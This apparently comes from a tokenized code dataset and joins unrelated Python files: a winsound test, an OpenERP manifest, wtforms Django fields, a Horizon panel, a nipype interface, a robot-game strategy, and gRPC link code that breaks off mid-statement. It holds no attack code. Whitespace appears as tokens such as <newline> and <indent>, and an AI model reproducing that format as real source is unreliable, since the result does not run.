self.assertRaises(...) ▁ form. ▁ The ▁ attempt ▁ may ▁ or ▁ may ▁ not <encdom>  # ▁ raise ▁ RuntimeError, ▁ but ▁ it ▁ shouldn't ▁ raise ▁ anything ▁ other <encdom>  # ▁ than ▁ RuntimeError, ▁ and ▁ that's ▁ all ▁ we're ▁ trying ▁ to ▁ test <encdom>  # ▁ here. ▁ The ▁ MS ▁ docs ▁ aren't ▁ clear ▁ about ▁ whether ▁ the ▁ SDK <encdom>  # ▁ PlaySound() ▁ with ▁ SND_ALIAS ▁ and ▁ SND_NODEFAULT ▁ will ▁ return <encdom>  # ▁ True ▁ or ▁ False ▁ when ▁ the ▁ alias ▁ is ▁ unknown. ▁ On ▁ Tim's ▁ WinXP <encdom>  # ▁ box ▁ today, ▁ it ▁ returns ▁ True ▁ (no ▁ exception ▁ is ▁ raised). ▁ What <encdom>  # ▁ we'd ▁ really ▁ like ▁ to ▁ test ▁ is ▁ that ▁ no ▁ sound ▁ is ▁ played, ▁ but <encdom>  # ▁ that ▁ requires ▁ first ▁ wiring ▁ an ▁ eardrum ▁ class ▁ into ▁ unittest <encdom>  # ▁ <wink>. <encdom> <indent> try : <newline> <indent> winsound . PlaySound ( '!"$%&/( # +*' , winsound . SND_ALIAS | winsound . SND_NODEFAULT ) <newline> <dedent> except RuntimeError : <newline> <indent> pass <newline> <dedent> <dedent> else : <newline> <indent> self . assertRaises ( RuntimeError , winsound . PlaySound , '!"$%&/( # +*' , winsound . SND_ALIAS | winsound . SND_NODEFAULT ) <newline> <dedent> <dedent> def test_stopasync ( self ) : <newline> <indent> if _have_soundcard ( ) : <newline> <indent> winsound . PlaySound ( 'SystemQuestion' , winsound . SND_ALIAS | winsound . SND_ASYNC | winsound . SND_LOOP ) <newline> time . sleep ( 0.5 ) <newline> try : <newline> <indent> winsound . PlaySound ( 'SystemQuestion' , winsound . SND_ALIAS | winsound . SND_NOSTOP ) <newline> <dedent> except RuntimeError : <newline> <indent> pass <newline> <dedent> else :  # ▁ the ▁ first ▁ sound ▁ might ▁ already ▁ be ▁ finished <encdom> <newline> <indent> pass <newline> <dedent> winsound . PlaySound ( None , winsound . SND_PURGE ) <newline> <dedent> else : <newline>  # ▁ Issue ▁ 8367: ▁ PlaySound(None, ▁ winsound.SND_PURGE) <encdom>  # ▁ does ▁ not ▁ raise ▁ on ▁ systems ▁ without ▁ a ▁ sound ▁ card. <encdom> <indent> pass <newline> <dedent> <dedent> <dedent> def _get_cscript_path ( ) : <newline> <indent>  """ Return ▁ the ▁ full ▁ path ▁ to ▁ cscript.exe ▁ or ▁ None. """  <newline> for dir in os . environ . get ( "PATH" , "" ) . split ( os . pathsep ) : <newline> <indent> cscript_path = os . path . join ( dir , "cscript.exe" ) <newline> if os . path . exists ( cscript_path ) : <newline> <indent> return cscript_path <newline> <dedent> <dedent> <dedent> __have_soundcard_cache = None <newline> def _have_soundcard ( ) : <newline> <indent>  """ Return ▁ True ▁ iff ▁ this ▁ computer ▁ has ▁ a ▁ soundcard. """  <newline> global __have_soundcard_cache <newline> if __have_soundcard_cache is None : <newline> <indent> cscript_path = _get_cscript_path ( ) <newline> if cscript_path is None : <newline>  # ▁ Could ▁ not ▁ find ▁ cscript.exe ▁ to ▁ run ▁ our ▁ VBScript ▁ helper. ▁ Default <encdom>  # ▁ to ▁ True: ▁ most ▁ computers ▁ these ▁ days ▁ *do* ▁ have ▁ a ▁ soundcard. <encdom> <indent> return True <newline> <dedent> check_script = os . path . join ( os . path . dirname ( __file__ ) , "check_soundcard.vbs" ) <newline> p = subprocess . Popen ( [ cscript_path , check_script ] , stdout = subprocess . PIPE ) <newline> __have_soundcard_cache = not p . wait ( ) <newline> <dedent> return __have_soundcard_cache <newline> <dedent> def test_main ( ) : <newline> <indent> test_support . run_unittest ( BeepTest , MessageBeepTest , PlaySoundTest ) <newline> <dedent> if __name__ == "__main__" : <newline> <indent> test_main ( ) <newline> <dedent>
 # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom>  # ▁ OpenERP, ▁ Open ▁ Source ▁ Management ▁ Solution <encdom>  # ▁ Copyright ▁ (C) ▁ 2004-2010 ▁ Tiny ▁ SPRL ▁ (<http://tiny.be>). <encdom>  # ▁ This ▁ program ▁ is ▁ free ▁ software: ▁ you ▁ can ▁ redistribute ▁ it ▁ and/or ▁ modify <encdom>  # ▁ it ▁ under ▁ the ▁ terms ▁ of ▁ the ▁ GNU ▁ Affero ▁ General ▁ Public ▁ License ▁ as <encdom>  # ▁ published ▁ by ▁ the ▁ Free ▁ Software ▁ Foundation, ▁ either ▁ version ▁ 3 ▁ of ▁ the <encdom>  # ▁ License, ▁ or ▁ (at ▁ your ▁ option) ▁ any ▁ later ▁ version. <encdom>  # ▁ This ▁ program ▁ is ▁ distributed ▁ in ▁ the ▁ hope ▁ that ▁ it ▁ will ▁ be ▁ useful, <encdom>  # ▁ but ▁ WITHOUT ▁ ANY ▁ WARRANTY; ▁ without ▁ even ▁ the ▁ implied ▁ warranty ▁ of <encdom>  # ▁ MERCHANTABILITY ▁ or ▁ FITNESS ▁ FOR ▁ A ▁ PARTICULAR ▁ PURPOSE. ▁ See ▁ the <encdom>  # ▁ GNU ▁ Affero ▁ General ▁ Public ▁ License ▁ for ▁ more ▁ details. <encdom>  # ▁ You ▁ should ▁ have ▁ received ▁ a ▁ copy ▁ of ▁ the ▁ GNU ▁ Affero ▁ General ▁ Public ▁ License <encdom>  # ▁ along ▁ with ▁ this ▁ program. ▁ If ▁ not, ▁ see ▁ <http://www.gnu.org/licenses/>. <encdom> { 'name' : 'Invoice ▁ Picking ▁ Directly' , 'version' : '1.0' , 'category' : 'Warehouse ▁ Management' , 'description' :  """ <strnewline> Invoice ▁ Wizard ▁ for ▁ Delivery. <strnewline> ============================ <strnewline> <strnewline> When ▁ you ▁ send ▁ or ▁ deliver ▁ goods, ▁ this ▁ module ▁ automatically ▁ launch ▁ the ▁ invoicing <strnewline> wizard ▁ if ▁ the ▁ delivery ▁ is ▁ to ▁ be ▁ invoiced. <strnewline> ▁ ▁ ▁ ▁ """  , 'author' : 'OpenERP ▁ SA' , 'website' : 'http://www.openerp.com' , 'images' : [ 'images/create_invoice.jpeg' ] , 'depends' : [ 'delivery' , 'stock' ] , 'data' : [ ] , 'demo' : [ ] , 'test' : [ 'test/stock_invoice_directly.yml' ] , 'installable' : True , 'auto_install' : False , } <newline>  # ▁ vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4: <encdom>
 """ <strnewline> Useful ▁ form ▁ fields ▁ for ▁ use ▁ with ▁ the ▁ Django ▁ ORM. <strnewline> """  <newline> from __future__ import unicode_literals <newline> import operator <newline> from wtforms import widgets <newline> from wtforms . compat import string_types <newline> from wtforms . fields import SelectFieldBase <newline> from wtforms . validators import ValidationError <newline> __all__ = ( 'ModelSelectField' , 'QuerySetSelectField' , ) <newline> class QuerySetSelectField ( SelectFieldBase ) : <newline> <indent>  """ <strnewline> ▁ Given ▁ a ▁ QuerySet ▁ either ▁ at ▁ initialization ▁ or ▁ inside ▁ a ▁ view, ▁ will ▁ display ▁ a <strnewline> ▁ select ▁ drop-down ▁ field ▁ of ▁ choices. ▁ The ▁ `data` ▁ property ▁ actually ▁ will <strnewline> ▁ store/keep ▁ an ▁ ORM ▁ model ▁ instance, ▁ not ▁ the ▁ ID. ▁ Submitting ▁ a ▁ choice ▁ which ▁ is <strnewline> ▁ not ▁ in ▁ the ▁ queryset ▁ will ▁ result ▁ in ▁ a ▁ validation ▁ error. <strnewline> <strnewline> ▁ Specify ▁ `get_label` ▁ to ▁ customize ▁ the ▁ label ▁ associated ▁ with ▁ each ▁ option. ▁ If <strnewline> ▁ a ▁ string, ▁ this ▁ is ▁ the ▁ name ▁ of ▁ an ▁ attribute ▁ on ▁ the ▁ model ▁ object ▁ to ▁ use ▁ as <strnewline> ▁ the ▁ label ▁ text. ▁ If ▁ a ▁ one-argument ▁ callable, ▁ this ▁ callable ▁ will ▁ be ▁ passed <strnewline> ▁ model ▁ instance ▁ and ▁ expected ▁ to ▁ return ▁ the ▁ label ▁ text. ▁ Otherwise, ▁ the ▁ model <strnewline> ▁ object's ▁ `__str__` ▁ or ▁ `__unicode__` ▁ will ▁ be ▁ used. <strnewline> <strnewline> ▁ If ▁ `allow_blank` ▁ is ▁ set ▁ to ▁ `True`, ▁ then ▁ a ▁ blank ▁ choice ▁ will ▁ be ▁ added ▁ to ▁ the <strnewline> ▁ top ▁ of ▁ the ▁ list. ▁ Selecting ▁ this ▁ choice ▁ will ▁ result ▁ in ▁ the ▁ `data` ▁ property <strnewline> ▁ being ▁ `None`. ▁ The ▁ label ▁ for ▁ the ▁ blank ▁ choice ▁ can ▁ be ▁ set ▁ by ▁ specifying ▁ the <strnewline> ▁ `blank_text` ▁ parameter. <strnewline> ▁ """  <newline> widget = widgets . Select ( ) <newline> def __init__ ( self , label = None , validators = None , queryset = None , get_label = None , allow_blank = False , blank_text = '' , ** kwargs ) : <newline> <indent> super ( QuerySetSelectField , self ) . __init__ ( label , validators , ** kwargs ) <newline> self . allow_blank = allow_blank <newline> self . blank_text = blank_text <newline> self . _set_data ( None ) <newline> if queryset is not None : <newline> <indent> self . queryset = queryset . all ( )  # ▁ Make ▁ sure ▁ the ▁ queryset ▁ is ▁ fresh <encdom> <newline> <dedent> if get_label is None : <newline> <indent> self . get_label = lambda x : x <newline> <dedent> elif isinstance ( get_label , string_types ) : <newline> <indent> self . get_label = operator . attrgetter ( get_label ) <newline> <dedent> else : <newline> <indent> self . get_label = get_label <newline> <dedent> <dedent> def _get_data ( self ) : <newline> <indent> if self . _formdata is not None : <newline> <indent> for obj in self . queryset : <newline> <indent> if obj . pk == self . _formdata : <newline> <indent> self . _set_data ( obj ) <newline> break <newline> <dedent> <dedent> <dedent> return self . _data <newline> <dedent> def _set_data ( self , data ) : <newline> <indent> self . _data = data <newline> self . _formdata = None <newline> <dedent> data = property ( _get_data , _set_data ) <newline> def iter_choices ( self ) : <newline> <indent> if self . allow_blank : <newline> <indent> yield ( '__None' , self . blank_text , self . data is None ) <newline> <dedent> for obj in self . queryset : <newline> <indent> yield ( obj . pk , self . get_label ( obj ) , obj == self . data ) <newline> <dedent> <dedent> def process_formdata ( self , valuelist ) : <newline> <indent> if valuelist : <newline> <indent> if valuelist [ 0 ] == '__None' : <newline> <indent> self . data = None <newline> <dedent> else : <newline> <indent> self . _data = None <newline> self . _formdata = int ( valuelist [ 0 ] ) <newline> <dedent> <dedent> <dedent> def pre_validate ( self , form ) : <newline> <indent> if not self . allow_blank or self . data is not None : <newline> <indent> for obj in self . queryset : <newline> <indent> if self . data == obj : <newline> <indent> break <newline> <dedent> <dedent> else : <newline> <indent> raise ValidationError ( self . gettext ( 'Not ▁ a ▁ valid ▁ choice' ) ) <newline> <dedent> <dedent> <dedent> <dedent> class ModelSelectField ( QuerySetSelectField ) : <newline> <indent>  """ <strnewline> ▁ Like ▁ a ▁ QuerySetSelectField, ▁ except ▁ takes ▁ a ▁ model ▁ class ▁ instead ▁ of ▁ a <strnewline> ▁ queryset ▁ and ▁ lists ▁ everything ▁ in ▁ it. <strnewline> ▁ """  <newline> def __init__ ( self , label = None , validators = None , model = None , ** kwargs ) : <newline> <indent> super ( ModelSelectField , self ) . __init__ ( label , validators , queryset = model . _default_manager . all ( ) , ** kwargs ) <newline> <dedent> <dedent>
 # ▁ Licensed ▁ under ▁ the ▁ Apache ▁ License, ▁ Version ▁ 2.0 ▁ (the ▁"License"); ▁ you ▁ may <encdom>  # ▁ not ▁ use ▁ this ▁ file ▁ except ▁ in ▁ compliance ▁ with ▁ the ▁ License. ▁ You ▁ may ▁ obtain <encdom>  # ▁ a ▁ copy ▁ of ▁ the ▁ License ▁ at <encdom>  # ▁ http://www.apache.org/licenses/LICENSE-2.0 <encdom>  # ▁ Unless ▁ required ▁ by ▁ applicable ▁ law ▁ or ▁ agreed ▁ to ▁ in ▁ writing, ▁ software <encdom>  # ▁ distributed ▁ under ▁ the ▁ License ▁ is ▁ distributed ▁ on ▁ an ▁"AS ▁ IS" ▁ BASIS, ▁ WITHOUT <encdom>  # ▁ WARRANTIES ▁ OR ▁ CONDITIONS ▁ OF ▁ ANY ▁ KIND, ▁ either ▁ express ▁ or ▁ implied. ▁ See ▁ the <encdom>  # ▁ License ▁ for ▁ the ▁ specific ▁ language ▁ governing ▁ permissions ▁ and ▁ limitations <encdom>  # ▁ under ▁ the ▁ License. <encdom> import horizon <newline> class AnotherPanel ( horizon . Panel ) : <newline> <indent> name = "Another ▁ Plugin ▁ Panel" <newline> slug = 'another_panel' <newline> <dedent>
 # ▁ -*- ▁ coding: ▁ utf8 ▁ -*- <encdom>  """ Autogenerated ▁ file ▁ - ▁ DO ▁ NOT ▁ EDIT <strnewline> If ▁ you ▁ spot ▁ a ▁ bug, ▁ please ▁ report ▁ it ▁ on ▁ the ▁ mailing ▁ list ▁ and/or ▁ change ▁ the ▁ generator. """  <newline> import os <newline> from . . base import ( CommandLine , CommandLineInputSpec , SEMLikeCommandLine , TraitedSpec , File , Directory , traits , isdefined , InputMultiPath , OutputMultiPath ) <newline> class GenerateCsfClippedFromClassifiedImageInputSpec ( CommandLineInputSpec ) : <newline> <indent> inputCassifiedVolume = File ( desc = "Required: ▁ input ▁ tissue ▁ label ▁ image" , exists = True , argstr = "--inputCassifiedVolume ▁ %s" ) <newline> outputVolume = traits . Either ( traits . Bool , File ( ) , hash_files = False , desc = "Required: ▁ output ▁ image" , argstr = "--outputVolume ▁ %s" ) <newline> <dedent> class GenerateCsfClippedFromClassifiedImageOutputSpec ( TraitedSpec ) : <newline> <indent> outputVolume = File ( desc = "Required: ▁ output ▁ image" , exists = True ) <newline> <dedent> class GenerateCsfClippedFromClassifiedImage ( SEMLikeCommandLine ) : <newline> <indent>  """ title: ▁ GenerateCsfClippedFromClassifiedImage <strnewline> <strnewline> category: ▁ FeatureCreator <strnewline> <strnewline> description: ▁ Get ▁ the ▁ distance ▁ from ▁ a ▁ voxel ▁ to ▁ the ▁ nearest ▁ voxel ▁ of ▁ a ▁ given ▁ tissue ▁ type. <strnewline> <strnewline> version: ▁ 0.1.0.$Revision: ▁ 1 ▁ $(alpha) <strnewline> <strnewline> documentation-url: ▁ http:://www.na-mic.org/ <strnewline> <strnewline> license: ▁ https://www.nitrc.org/svn/brains/BuildScripts/trunk/License.txt <strnewline> <strnewline> contributor: ▁ This ▁ tool ▁ was ▁ written ▁ by ▁ Hans ▁ J. ▁ Johnson. <strnewline> <strnewline> """  <newline> input_spec = GenerateCsfClippedFromClassifiedImageInputSpec <newline> output_spec = GenerateCsfClippedFromClassifiedImageOutputSpec <newline> _cmd = " ▁ GenerateCsfClippedFromClassifiedImage ▁ " <newline> _outputs_filenames = { 'outputVolume' : 'outputVolume.nii' } <newline> _redirect_x = False <newline> <dedent>
from robot import Robot <newline> class TheRobot ( Robot ) : <newline> <indent>  ''' Strategy: <strnewline> ▁ Drive ▁ around ▁ real ▁ fast, <strnewline> ▁ Don't ▁ run ▁ in ▁ to ▁ anything, <strnewline> ▁ Shoot ▁ stuff ▁ that ▁ gets ▁ in ▁ the ▁ way. <strnewline> ▁ '''  <newline> def initialize ( self ) : <newline> <indent> self . _spinning = False <newline> <dedent> def respond ( self ) : <newline> <indent> if self . _spinning : <newline> <indent> self . spin ( ) <newline> <dedent> self . ping ( ) <newline> self . ping_react ( ) <newline> self . turret_forward ( ) <newline> <dedent> def turret_forward ( self ) : <newline> <indent> 'keep ▁ the ▁ turret ▁ pointed ▁ straight ▁ ahead.' <newline> tur = self . sensors [ 'TUR' ] <newline> if tur : <newline> <indent> gain = 10 <newline> self . turret ( - gain * tur ) <newline> <dedent> <dedent> def spin ( self , n = None ) : <newline>  # ▁ Spin ▁ for ▁ n ▁ ticks, ▁ then ▁ stop <encdom> <indent> self . force ( 0 ) <newline> self . torque ( 100 ) <newline> if n is not None : <newline> <indent> self . _spinning = True <newline> self . _spin_n = n <newline> <dedent> else : <newline> <indent> self . _spin_n -= 1 <newline> if self . _spin_n <= 0 : <newline> <indent> self . _spinning = False <newline> <dedent> <dedent> <dedent> def ping_react ( self ) : <newline> <indent> kind , angle , dist = self . sensors [ 'PING' ] <newline> if kind == 'w' and not self . _spinning : <newline>  # ▁ Pinged ▁ a ▁ wall <encdom> <indent> if dist < 8 : <newline> <indent> self . spin ( 30 ) <newline> <dedent> elif dist > 20 : <newline> <indent> self . force ( 100 ) <newline> self . torque ( 0 ) <newline> <dedent> else : <newline> <indent> self . force ( 60 ) <newline> self . torque ( 0 ) <newline> <dedent> <dedent> elif kind == 'r' : <newline>  # ▁ Pinged ▁ a ▁ robot <encdom> <indent> self . fire ( ) <newline> if dist < 5 : <newline> <indent> self . force ( - 10 ) <newline> <dedent> else : <newline> <indent> self . force ( 10 ) <newline> self . torque ( 10 ) <newline> <dedent> <dedent> <dedent> <dedent>
 # ▁ Copyright ▁ 2015, ▁ Google ▁ Inc. <encdom>  # ▁ All ▁ rights ▁ reserved. <encdom>  # ▁ Redistribution ▁ and ▁ use ▁ in ▁ source ▁ and ▁ binary ▁ forms, ▁ with ▁ or ▁ without <encdom>  # ▁ modification, ▁ are ▁ permitted ▁ provided ▁ that ▁ the ▁ following ▁ conditions ▁ are <encdom>  # ▁ met: <encdom>  # ▁ * ▁ Redistributions ▁ of ▁ source ▁ code ▁ must ▁ retain ▁ the ▁ above ▁ copyright <encdom>  # ▁ notice, ▁ this ▁ list ▁ of ▁ conditions ▁ and ▁ the ▁ following ▁ disclaimer. <encdom>  # ▁ * ▁ Redistributions ▁ in ▁ binary ▁ form ▁ must ▁ reproduce ▁ the ▁ above <encdom>  # ▁ copyright ▁ notice, ▁ this ▁ list ▁ of ▁ conditions ▁ and ▁ the ▁ following ▁ disclaimer <encdom>  # ▁ in ▁ the ▁ documentation ▁ and/or ▁ other ▁ materials ▁ provided ▁ with ▁ the <encdom>  # ▁ distribution. <encdom>  # ▁ * ▁ Neither ▁ the ▁ name ▁ of ▁ Google ▁ Inc. ▁ nor ▁ the ▁ names ▁ of ▁ its <encdom>  # ▁ contributors ▁ may ▁ be ▁ used ▁ to ▁ endorse ▁ or ▁ promote ▁ products ▁ derived ▁ from <encdom>  # ▁ this ▁ software ▁ without ▁ specific ▁ prior ▁ written ▁ permission. <encdom>  # ▁ THIS ▁ SOFTWARE ▁ IS ▁ PROVIDED ▁ BY ▁ THE ▁ COPYRIGHT ▁ HOLDERS ▁ AND ▁ CONTRIBUTORS <encdom>  # ▁"AS ▁ IS" ▁ AND ▁ ANY ▁ EXPRESS ▁ OR ▁ IMPLIED ▁ WARRANTIES, ▁ INCLUDING, ▁ BUT ▁ NOT <encdom>  # ▁ LIMITED ▁ TO, ▁ THE ▁ IMPLIED ▁ WARRANTIES ▁ OF ▁ MERCHANTABILITY ▁ AND ▁ FITNESS ▁ FOR <encdom>  # ▁ A ▁ PARTICULAR ▁ PURPOSE ▁ ARE ▁ DISCLAIMED. ▁ IN ▁ NO ▁ EVENT ▁ SHALL ▁ THE ▁ COPYRIGHT <encdom>  # ▁ OWNER ▁ OR ▁ CONTRIBUTORS ▁ BE ▁ LIABLE ▁ FOR ▁ ANY ▁ DIRECT, ▁ INDIRECT, ▁ INCIDENTAL, <encdom>  # ▁ SPECIAL, ▁ EXEMPLARY, ▁ OR ▁ CONSEQUENTIAL ▁ DAMAGES ▁ (INCLUDING, ▁ BUT ▁ NOT <encdom>  # ▁ LIMITED ▁ TO, ▁ PROCUREMENT ▁ OF ▁ SUBSTITUTE ▁ GOODS ▁ OR ▁ SERVICES; ▁ LOSS ▁ OF ▁ USE, <encdom>  # ▁ DATA, ▁ OR ▁ PROFITS; ▁ OR ▁ BUSINESS ▁ INTERRUPTION) ▁ HOWEVER ▁ CAUSED ▁ AND ▁ ON ▁ ANY <encdom>  # ▁ THEORY ▁ OF ▁ LIABILITY, ▁ WHETHER ▁ IN ▁ CONTRACT, ▁ STRICT ▁ LIABILITY, ▁ OR ▁ TORT <encdom>  # ▁ (INCLUDING ▁ NEGLIGENCE ▁ OR ▁ OTHERWISE) ▁ ARISING ▁ IN ▁ ANY ▁ WAY ▁ OUT ▁ OF ▁ THE ▁ USE <encdom>  # ▁ OF ▁ THIS ▁ SOFTWARE, ▁ EVEN ▁ IF ▁ ADVISED ▁ OF ▁ THE ▁ POSSIBILITY ▁ OF ▁ SUCH ▁ DAMAGE. <encdom>  """ The ▁ RPC-invocation-side ▁ bridge ▁ between ▁ RPC ▁ Framework ▁ and ▁ GRPC-on-the-wire. """  <newline> import abc <newline> import enum <newline> import logging <newline> import threading <newline> import time <newline> import six <newline> from grpc . _adapter import _intermediary_low <newline> from grpc . _links import _constants <newline> from grpc . beta import interfaces as beta_interfaces <newline> from grpc . framework . foundation import activated <newline> from grpc . framework . foundation import logging_pool <newline> from grpc . framework . foundation import relay <newline> from grpc . framework . interfaces . links import links <newline> _IDENTITY = lambda x : x <newline> _STOP = _intermediary_low . Event . Kind . STOP <newline> _WRITE = _intermediary_low . Event . Kind . WRITE_ACCEPTED <newline> _COMPLETE = _intermediary_low . Event . Kind . COMPLETE_ACCEPTED <newline> _READ = _intermediary_low . Event . Kind . READ_ACCEPTED <newline> _METADATA = _intermediary_low . Event . Kind . METADATA_ACCEPTED <newline> _FINISH = _intermediary_low . Event . Kind . FINISH <newline> @ enum . unique <newline> class _Read ( enum . Enum ) : <newline> <indent> AWAITING_METADATA = 'awaiting ▁ metadata' <newline> READING = 'reading' <newline> AWAITING_ALLOWANCE = 'awaiting ▁ allowance' <newline> CLOSED = 'closed' <newline> <dedent> @ enum . unique <newline> class _HighWrite ( enum . Enum ) : <newline> <indent> OPEN = 'open' <newline> CLOSED = 'closed' <newline> <dedent> @ enum . unique <newline> class _LowWrite ( enum . Enum ) : <newline> <indent> OPEN = 'OPEN' <newline> ACTIVE = 'ACTIVE' <newline> CLOSED = 'CLOSED' <newline> <dedent> class _Context ( beta_interfaces . GRPCInvocationContext ) : <newline> <indent> def __init__ ( self ) : <newline> <indent> self . _lock = threading . Lock ( ) <newline> self . _disable_next_compression = False <newline> <dedent> def disable_next_request_compression ( self ) : <newline> <indent> with self . _lock : <newline> <indent> self . _disable_next_compression = True <newline> <dedent> <dedent> def next_compression_disabled ( self ) : <newline> <indent> with self . _lock : <newline> <indent> disabled = self . _disable_next_compression <newline> self . _disable_next_compression = False <newline> return disabled <newline> <dedent> <dedent> <dedent> class _RPCState ( object ) : <newline> <indent> def __init__ ( self , call , request_serializer , response_deserializer , sequence_number , read , allowance , high_write , low_write , due , context ) : <newline> <indent> self . call = call <newline> self . request_serializer = request_serializer <newline> self . response_deserializer = response_deserializer <newline> self . sequence_number = sequence_number <newline> self . read = read <newline> self . allowance = allowance <newline> self . high_write = high_write <newline> self . low_write = low_write <newline> self . due = due <newline> self . context = context <newline> <dedent> <dedent> def _no_longer_due ( kind , rpc_state , key , rpc_states ) : <newline> <indent> rpc_state . due . remove ( kind ) <newline> if not rpc_state . due : <newline> <indent> del rpc_states [ key ] <newline> <dedent> <dedent> class _Kernel ( object ) : <newline> <indent> def __init__ ( self , channel , host , metadata_transformer , request_serializers , response_deserializers , ticket_relay ) : <newline> <indent> self . _lock = threading . Lock ( ) <newline> self . _channel = channel <newline> self . _host = host <newline> self . _metadata_transformer = metadata_transformer <newline> self . _request_serializers = request_serializers <newline> self . _response_deserializers = response_deserializers <newline> self . _relay = ticket_relay <newline> self . _completion_queue = None <newline> self . _rpc_states = { } <newline> self . _pool = None <newline> <dedent> def _on_write_event ( self , operation_id , unused_event , rpc_state ) : <newline> <indent> if rpc_state . high_write is _HighWrite . CLOSED : <newline> <indent> rpc_state . call . complete ( operation_id ) <newline> rpc_state . due . add ( _COMPLETE ) <newline> rpc_state . due . remove ( _WRITE ) <newline> rpc_state . low_write = _LowWrite . CLOSED <newline> <dedent> else : <newline> <indent> ticket = links . Ticket ( operation_id , rpc_state . sequence_number , None , None , None , None , 1 , None , None , None , None , None , None , None ) <newline> rpc_state . sequence_number += 1 <newline> self . _relay . add_value ( ticket ) <newline> rpc_state . low_write = _LowWrite . OPEN <newline> _no_longer_due ( _WRITE , rpc_state , operation_id , self . _rpc_states ) <newline> <dedent> <dedent> def _on_read_event ( self , operation_id , event , rpc_state ) : <newline> <indent> if event . bytes is None or _FINISH not in rpc_state . due : <newline> <indent> rpc_state . read = _Read . CLOSED <newline> _no_longer_due ( _READ , rpc_state , operation_id , self . _rpc_states ) <newline> <dedent> else : <newline> <indent> if 0 < rpc_state . allowance : <newline> <indent> rpc_state . allowance -= 1 <newline> rpc_state . call . read ( operation_id ) <newline> <dedent> else : <newline> <indent> rpc_state . read = _Read . AWAITING_ALLOWANCE <newline> _no_longer_due ( _READ , rpc_state , operation_id , self . _rpc_states ) <newline> <dedent> ticket = links . Ticket ( operation_id , rpc_state . sequence_number , None , None , None , None , None , None , rpc_state . response_deserializer ( event . bytes ) , None , None , None , None , None ) <newline> rpc_state . sequence_number += 1 <newline> self . _relay . add_value ( ticket ) <newline> <dedent> <dedent> def _on_metadata_event ( self , operation_id , event , rpc_state ) : <newline> <indent> if _FINISH in rpc_state . due : <newline> <indent> rpc_state . allowance -= 1 <newline> rpc_state . call . read ( operation_id ) <newline> rpc_state . read = _Read . READING <newline> rpc_state . due . add ( _READ ) <newline> rpc_state . due . remove ( _METADATA ) <newline> ticket = links . Ticket ( operation_id , rpc_state . sequence_number , None , None , links . Ticket . Subscription . FULL , None , None , event . metadata , None , None , None , None , None , None ) <newline> rpc_state . sequence_number += 1 <newline> self . _relay . add_value ( ticket ) <newline> <dedent> else : <newline> <indent> _no_longer_due ( _METADATA , rpc_state , operation_id , self . _rpc_states ) <newline> <dedent> <dedent> def _on_finish_event ( self , operation_id , event , rpc_state ) : <newline> <indent> _no_longer_due ( _FINISH , rpc_state , operation_id , self . _rpc_states ) <newline> if event . status . code == _intermediary_low . Code . OK : <newline> <indent> termination = links . Ticket . Termination . COMPLETION <newline> <dedent> elif event . status . code == _intermediary_low . Code . CANCELLED : <newline> <indent> termination = links . Ticket . Termination . CANCELLATION <newline> <dedent> elif event . status . code == _intermediary_low . Code . DEADLINE_EXCEEDED : <newline> <indent> termination = links . Ticket . Termination . EXPIRATION <newline> <dedent> elif event . status . code == _intermediary_low . Code . UNIMPLEMENTED : <newline> <indent> termination = links . Ticket . Termination . REMOTE_FAILURE <newline> <dedent> elif event . status . code == _intermediary_low . Code . UNKNOWN : <newline> <indent> termination = links . Ticket . Termination . LOCAL_FAILURE <newline> <dedent> else : <newline> <indent> termination = links . Ticket . Termination . TRANSMISSION_FAILURE <newline> <dedent> code = _constants . LOW_STATUS_CODE_TO_HIGH_STATUS_CODE [ event . status . code ] <newline> ticket = links . Ticket ( operation_id , rpc_state . sequence_number , None , None , None , None , None , None , None , event . metadata , code , event . status . details , termination , None ) <newline> rpc_state . sequence_number += 1 <newline> self . _relay . add_value ( ticket ) <newline> <dedent> def _spin ( self , completion_queue ) : <newline> <indent> while True : <newline> <indent> event = completion_queue . get ( None ) <newline> with self . _lock : <newline> <indent> rpc_state = self . _rpc_states . get ( event . tag , None ) <newline> if event . kind is _STOP : <newline> <indent> pass <newline> <dedent> elif event . kind is _WRITE : <newline> <indent> self . _on_write_event ( event . tag , event , rpc_state ) <newline> <dedent> elif event . kind is _METADATA : <newline> <indent> self . _on_metadata_event ( event . tag , event , rpc_state ) <newline> <dedent> elif event . kind is _READ : <newline> <indent> self . _on_read_event ( event . tag , event , rpc_state ) <newline> <dedent> elif event . kind is _FINISH : <newline> <indent> self . _on_finish_event ( event . tag , event , rpc_state ) <newline> <dedent> elif event . kind is _COMPLETE : <newline> <indent> _no_longer_due ( _COMPLETE , rpc_state , event . tag , self . _rpc_states ) <newline> <dedent> else : <newline> <indent> logging . error ( 'Illegal ▁ RPC ▁ event! ▁ %s' , ( event , ) ) <newline> <dedent> if self . _completion_queue is None and not self . _rpc_states : <newline> <indent> completion_queue . stop ( ) <newline> return <newline> <dedent> <dedent> <dedent> <dedent> def _invoke ( self , operation_id , group , method , initial_metadata , payload , termination , timeout , allowance , options ) : <newline> <indent>  """ Invoke ▁ an ▁ RPC. <strnewline> <strnewline> ▁ Args: <strnewline> ▁ operation_id: ▁ Any ▁ object ▁ to ▁ be ▁ used ▁ as ▁ an ▁ operation ▁ ID ▁ for ▁ the ▁ RPC. <strnewline> ▁ group: ▁ The ▁ group ▁ to ▁ which ▁ the ▁ RPC ▁ method ▁ belongs. <strnewline> ▁ method: ▁ The ▁ RPC ▁ method ▁ name. <strnewline> ▁ initial_metadata: ▁ The ▁ initial ▁ metadata ▁ object ▁ for ▁ the ▁ RPC. <strnewline> ▁ payload: ▁ A ▁ payload ▁ object ▁ for ▁ the ▁ RPC ▁ or ▁ None ▁ if ▁ no ▁ payload ▁ was ▁ given ▁ at <strnewline> ▁ invocation-time. <strnewline> ▁ termination: ▁ A ▁ links.Ticket.Termination ▁ value ▁ or ▁ None ▁ indicated ▁ whether ▁ or <strnewline> ▁ not ▁ more ▁ writes ▁ will ▁ follow ▁ from ▁ this ▁ side ▁ of ▁ the ▁ RPC. <strnewline> ▁ timeout: ▁ A ▁ duration ▁ of ▁ time ▁ in ▁ seconds ▁ to ▁ allow ▁ for ▁ the ▁ RPC. <strnewline> ▁ allowance: ▁ The ▁ number ▁ of ▁ payloads ▁ (beyond ▁ the ▁ free ▁ first ▁ one) ▁ that ▁ the <strnewline> ▁ local ▁ ticket ▁ exchange ▁ mate ▁ has ▁ granted ▁ permission ▁ to ▁ be ▁ read. <strnewline> ▁ options: ▁ A ▁ beta_interfaces.GRPCCallOptions ▁ value ▁ or ▁ None. <strnewline> ▁ """  <newline> if termination is links 